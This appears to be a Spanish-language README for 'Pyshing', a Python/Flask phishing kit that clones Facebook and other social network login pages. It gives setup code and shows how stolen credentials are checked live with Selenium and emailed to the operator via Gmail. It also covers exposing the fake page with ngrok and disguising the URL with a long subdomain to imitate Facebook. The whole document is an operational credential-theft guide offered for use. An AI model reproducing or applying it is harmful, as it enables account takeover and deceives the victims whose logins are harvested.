# Pyshing
Es una herramienta que permite recrear paginas webs de redes sociales famosas para poder lograr un ataque de pishing. La herramienta se vuelve más poderosa al expander sus capacidades con otra herramienta.

Se basa en el módulo `Flask` para crear un servidor web, las plantillas de la página web vienen por defecto, aunque puedes implementar las tuyas propias especificando el direcotrio de renderización.
El módulo permite personalizar varios aspectos, como por ejemplo si se desea verificar que el correo o contraseña sean correctos,  renderizado de plantillas, creación de más rutas.

## Crear ataque
La forma de crear un ataque de pishing es bastante fácil.

```python
from Pyshing import Scraping, Facebook

browser = Scraping.Browser("Firefox", "/route/geckodriver")

my_info = {"email": "email@gmail.com", "application_password": "password"}

fb = Facebook(browser, my_info)
fb.start()

if "__main__"== __name__:
    fb.app.run(debug=True)
```

En este caso importamos las clases `Browser` (del archivo Scraping) y `Facebook`. La clase `Browser` nos servirá para crear un navegador usando selenium para poder verificar que las credenciales sean correctas, al loggearse se envía los datos a la ruta `/data` que iniciará el navegador y colocará las credenciales, en caso de que alguna sea erronea el mensaje será reflejado en la pagina. La clase `Browser` recibe dos parámetros, el primero es el tipo de navegador que se desea ejecutar y el segundo es la ruta del driver de dicho navegador. Si no se desea especificar un navegador debe pasar `None` como primer argumento a `Facebook`.

También se necesita un diccionario con datos tuyos. Estos datos serán usados para enviarte un correo electronico con las credenciales de la víctima. El diccionario se compone de dos elementos.

- `email`: Indica la dirección de correo electronico al cual se enviará el mensaje (por el momento solo se acepta Gmail).
- `application_password`: La contraseña de applicación creada en el panel de configuración de cueta en Gmail.

Se necesita proporcionar una contraseña de aplicación dado que gmail no permite iniciar sesión en la cuenta con las credenciales normales, además se vuelve algo más seguro ya que la contraseña de aplicación puede ser eliminada en cualquier momento. Se necesita acceso a su cuenta de Gmail dado que el correo electronico es uno que se envía a si mismo, es decir de ti para ti.

Una vez hecho eso se crea la instancia de la clase `Facebook` (o la red social que desee) y como primer parámetro se coloca el navegadr (`None` en caso de no requerirlo) y como segundo parámetro sus credenciales. Luego se inicializan las rutas por defecto invocando al método `start()` y se pone en marcha el servidor accediendo a la variable `app` y al método `run()`. Cabe aclarar que la variable de instancia `app` es una instancia de  `Flask(__name__)`.

***Nota**: *No hacemos uso indebido de su correo electronico mientras está logeado, tampoco guardamos sus credenciales, hasta el momento ningún dato de usted o la victima es almacenado y mucho menos compartido*  (agregar esa funcionalidad significa escribir más código :c )

## Hacer público el servidor
Todo esto ocurre localmente y si usted no tiene forma de hacer que su servidor local sea accesible desde fuera estará perdido, salvo por una mágica herramienta llamada `ngrok` la cual puede instalar desde su [página](). Una vez instalado deberás levantar el servidor de ngrok con el comando
```
ngrok http 127.0.0.1:<puerto_de_tu_app_flask>
```
Por defecto flask inicia la app en el puerto `5000` pero puede variar, solo revisa la consola de tu servidor flask.

## Mejorando ataque
Para mejorar el ataque podemos modificar la url que visita nuestra víctima, para ello utilizaremos un subdominio bastante largo para que parezca la pagina de facebook y poder ocultar el dominio real. Para esto se ha creado un proyecto no público donde se da opción de poder utilizar un subdominio. Para esto debes crear una cuenta en `https://create-domain-for-pyshing.herokuapp.com/` mediante una solicitud `POST` a la ruta `/register` con la siguiente estrucura JSON:

```json
{
	"username": "tu_nombre_de_usuario",
	"password": "tu_contraseña_hipersegura"
}
```
Luego deberás logearte enviando una solicitud `POST` a la ruta `/login`, con el siguiente formato JSON:
```json
{
	"username": "tu_nombre_de_usuario",
	"password": "tu_contraseña_hipersegura",
	"url": "tu_url_de_ngrok"
}
```
Luego se te proporcionará un token el cual deberás usar en las peticiones siguientes. 
Finalmente tendrás que enviar una petición `POST` a la ruta `/createsubdomain` donde enviarás el token en el header `Authorization` o `X-Access-Token`. Con ello ya podrás utilizar un subdominio de manera temporal.